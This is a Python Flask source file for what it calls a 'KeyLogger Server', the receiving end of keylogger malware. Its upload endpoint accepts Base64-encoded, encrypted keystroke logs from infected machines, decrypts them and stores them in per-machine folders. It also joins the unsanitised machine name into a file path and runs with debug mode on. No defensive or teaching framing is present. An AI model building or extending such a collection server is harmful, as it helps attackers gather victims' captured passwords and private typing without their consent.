import os
import time
import base64
from flask import Flask, jsonify, request
import encryption

app = Flask(__name__)
DATA_FOLDER = 'data'

# Make sure base "data" folder exists
if not os.path.exists(DATA_FOLDER):
    os.makedirs(DATA_FOLDER)


@app.route('/')
def home():
    return "KeyLogger Server is Running"


def generate_log_filename():
    """Generates a unique filename for the log file."""
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"


@app.route('/api/upload', methods=['POST'])
def upload():
    """
    Handles the upload of encrypted log data from a client.
    The data is expected to be Base64-encoded.
    """
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data or "encryption_key" not in data:
        return jsonify({"error": "Invalid payload: machine, data, and encryption_key are required"}), 400

    machine = data["machine"]
    encrypted_b64_data = data["data"]  # This is the Base64 string
    encryption_key = data["encryption_key"]

    try:
        # First, decode the Base64 string back to raw bytes
        encrypted_bytes = base64.b64decode(encrypted_b64_data)

        # Then, decrypt the bytes
        encryptor = encryption.Encryptor(encryption_key)
        decrypted_bytes = encryptor.decrypt(encrypted_bytes)

        # Finally, decode the decrypted bytes to a string for writing to a file
        log_data = decrypted_bytes.decode('utf-8')

    except Exception as e:
        # This will catch errors from both base64 decoding and decryption
        return jsonify({"error": f"Failed to process data: {str(e)}"}), 400

    machine_folder = os.path.join(DATA_FOLDER, machine)
    # Use os.path.join for cross-platform compatibility
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)

    try:
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(log_data)
    except IOError as e:
        return jsonify({"error": f"Failed to write to file: {str(e)}"}), 500

    return jsonify({"status": "success", "file": filename}), 200


if __name__ == '__main__':
    # Running the Flask app
    app.run(host="127.0.0.1", port=5000, debug=True)
